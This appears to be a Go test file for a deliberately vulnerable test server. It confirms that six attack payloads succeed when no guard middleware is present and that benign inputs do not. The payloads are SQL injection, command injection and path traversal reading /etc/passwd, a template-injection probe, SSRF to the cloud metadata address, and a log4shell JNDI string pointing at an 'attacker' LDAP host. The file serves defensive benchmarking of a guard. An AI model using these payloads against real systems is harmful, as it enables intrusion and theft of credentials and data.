package http_test

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/m-mizutani/gt"
)

// attackCase drives one endpoint with an attack payload and expects it to fire.
type attackCase struct {
	name     string
	method   string
	path     string
	body     string
	header   [2]string
	category string
}

// TestNoGuard_AllVulnerabilitiesFire confirms that, with no guard middleware in
// front, every injection point actually fires. This is the baseline the guard
// (semgate) will later be measured against: with the guard, these same requests
// must be blocked before reaching the handler.
func TestNoGuard_AllVulnerabilitiesFire(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	cases := []attackCase{
		{name: "sqli", method: http.MethodPost, path: "/api/login",
			body: `{"username":"admin' OR '1'='1","password":"x"}`, category: "sqli"},
		{name: "command_injection", method: http.MethodGet,
			path: "/api/ping?host=" + urlEnc("example.com; cat /etc/passwd"), category: "command_injection"},
		{name: "path_traversal", method: http.MethodGet,
			path: "/api/files?path=" + urlEnc("../../../etc/passwd"), category: "path_traversal"},
		{name: "ssti", method: http.MethodGet,
			path: "/api/greet?name=" + urlEnc("{{7*7}}"), category: "ssti"},
		{name: "ssrf", method: http.MethodGet,
			path: "/api/fetch?url=" + urlEnc("http://169.254.169.254/latest/meta-data/"), category: "ssrf"},
		{name: "log4shell", method: http.MethodGet, path: "/api/track",
			header: [2]string{"X-Log-Tag", "${jndi:ldap://attacker/x}"}, category: "log4shell"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := doRequest(t, srv.URL, tc)
			gt.Bool(t, env.Exploited).True()
			gt.String(t, env.Category).Equal(tc.category)
			gt.String(t, env.RuleID).IsNotEmpty()
			gt.String(t, env.Detail).IsNotEmpty()
		})
	}
}

// TestNoGuard_BenignInputsDoNotFire is the paired negative: benign inputs to the
// same endpoints must NOT fire, so the range is not trivially always-firing.
func TestNoGuard_BenignInputsDoNotFire(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	cases := []attackCase{
		{name: "sqli", method: http.MethodPost, path: "/api/login",
			body: `{"username":"alice","password":"wrong"}`},
		{name: "command_injection", method: http.MethodGet, path: "/api/ping?host=" + urlEnc("example.com")},
		{name: "path_traversal", method: http.MethodGet, path: "/api/files?path=" + urlEnc("report.txt")},
		{name: "ssti", method: http.MethodGet, path: "/api/greet?name=" + urlEnc("Alice")},
		{name: "ssrf", method: http.MethodGet, path: "/api/fetch?url=" + urlEnc("https://example.com")},
		{name: "log4shell", method: http.MethodGet, path: "/api/track",
			header: [2]string{"X-Log-Tag", "Mozilla/5.0"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			env := doRequest(t, srv.URL, tc)
			gt.Bool(t, env.Exploited).False()
		})
	}
}

func doRequest(t *testing.T, baseURL string, tc attackCase) respEnvelope {
	t.Helper()
	var bodyReader *strings.Reader
	if tc.body != "" {
		bodyReader = strings.NewReader(tc.body)
	} else {
		bodyReader = strings.NewReader("")
	}
	req, err := http.NewRequest(tc.method, baseURL+tc.path, bodyReader)
	gt.NoError(t, err)
	if tc.body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	if tc.header[0] != "" {
		req.Header.Set(tc.header[0], tc.header[1])
	}
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	return decodeEnvelope(t, res.Body)
}

func urlEnc(s string) string {
	r := strings.NewReplacer(
		" ", "%20", ";", "%3B", "/", "%2F", "{", "%7B", "}", "%7D",
		"'", "%27", "*", "%2A", ":", "%3A", "$", "%24",
	)
	return r.Replace(s)
}
